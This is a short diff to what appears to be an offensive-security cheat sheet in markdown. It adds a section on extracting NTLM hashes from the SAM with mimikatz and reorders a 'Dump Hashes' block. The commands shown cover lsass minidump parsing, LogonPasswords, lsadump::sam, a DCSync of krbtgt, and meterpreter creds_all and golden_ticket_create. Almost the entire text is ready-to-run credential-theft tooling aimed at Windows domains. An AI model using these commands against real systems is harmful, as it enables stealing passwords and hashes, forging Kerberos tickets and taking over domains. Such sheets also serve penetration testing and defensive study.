@@ -3239,14 +3239,22 @@ lsadump::cache
 lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 ```
 
+##### Extract NTLM Hashes fromSAM
+
+```c
+.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+```
+
 ##### Dump Hashes
 
 ```c
 .\mimikatz.exe
+privilege::debug
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
-token::elevate
-lsadump::sam
 meterpreter > getprivs
 meterpreter > creds_all
 meterpreter > golden_ticket_create
